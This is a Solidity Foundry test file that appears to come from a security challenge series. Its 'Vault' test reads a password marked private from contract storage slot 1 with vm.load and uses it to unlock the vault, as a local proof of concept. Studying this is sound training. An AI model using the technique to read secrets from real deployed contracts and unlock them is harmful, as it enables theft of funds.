// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Vault} from "../src/08-Vault.sol";

contract VaultTest is Test {
    Vault public vault;
    bytes32 public secretPassword = bytes32("A_Very_Secret_Password_12345678");

    function setUp() public {
        vault = new Vault(secretPassword);
    }

    function test_InitialStateIsLocked() public view {
        assertTrue(vault.locked(), "Vault should start locked");
    }

    function test_ReadPrivateStorageAndUnlock() public {
        // Vault storage layout:
        // Slot 0: bool locked
        // Slot 1: bytes32 private password

        // Even though 'password' is marked private in Solidity,
        // it is completely visible in contract storage.
        // We use vm.load to read Slot 1 directly:
        bytes32 leakedPassword = vm.load(address(vault), bytes32(uint256(1)));

        // Verify the leaked password matches what was passed in constructor
        assertEq(leakedPassword, secretPassword);

        // Unlock the vault using the leaked password
        vault.unlock(leakedPassword);

        // Verify the vault is now unlocked!
        assertFalse(vault.locked(), "Vault failed to unlock");
        console2.log("Local PoC Success: Leaked password was:");
        console2.logBytes32(leakedPassword);
    }
}
